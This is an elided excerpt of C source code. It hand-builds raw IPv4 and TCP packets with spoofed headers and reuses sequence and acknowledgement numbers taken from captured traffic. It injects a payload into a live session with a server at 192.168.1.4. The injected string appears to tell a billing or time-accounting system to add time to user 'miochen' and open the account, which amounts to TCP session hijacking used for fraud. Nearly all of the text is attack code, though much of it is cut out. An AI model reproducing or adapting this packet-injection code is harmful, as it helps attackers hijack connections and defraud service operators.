...
USHORT checksum(USHORT *buffer, int size)
{
 ...
 const unsigned char* Send_forged(const unsigned char *p , bool client,USHORT src,USHORT dest)
{
	...
	char kalampolo[]="ReceiptBeginTransaction{end}UserAddSpecialTime=miochen^600^0^1^True{end}UserOpenAccount=miochen{end}ReceiptEndTransaction{end}";
	//char kalampolo[]="hello, this is captain john";
...
//	SOCKADDR_STORAGE dest;
	...
	pipv4->ip_tos=0;
	pipv4->ip_totallength=htons(sizeof(ipv4)+sizeof(tcphdr)+sizeof(kalampolo)-1);  //must put it dynamically
	pipv4->ip_id=0;
	pipv4->ip_offset=0;
	pipv4->ip_ttl=24; //TTL is 8
	...
	pipv4->ip_dest=inet_addr("192.168.1.4"); //must put it dynamically 192.168.1.4 for server

	pipv4->ip_checksum=checksum((USHORT*)pipv4,sizeof(ipv4));


	ptcphdr=(tcp_hdr*)&buf[sizeof(ip_hdr1)+sizeof(ethernet)];
	ptcphdr->tcp_srcport=htons(sourceport); //must put dynamically
	ptcphdr->tcp_dstport=htons(destport); //must put dynamically
	...
	if(client)
	{
		seq=*(unsigned int*)&p[max];
		max+=4;
		ack=*(unsigned int*)&p[max];
	...
	ptcphdr->tcp_offset=htons(0x5<<12|(0x10));//0x04 for rst  //0x18 for push ack //0x10 for ack
	//ptcphdr->tcp_flags=0x01;
	ptcphdr->tcp_windowsize=htons(28);
...
*/
	...
	int wtf=(sizeof(ethernet)+sizeof(ipv4)+sizeof(tcphdr)+sizeof(kalampolo)-1);
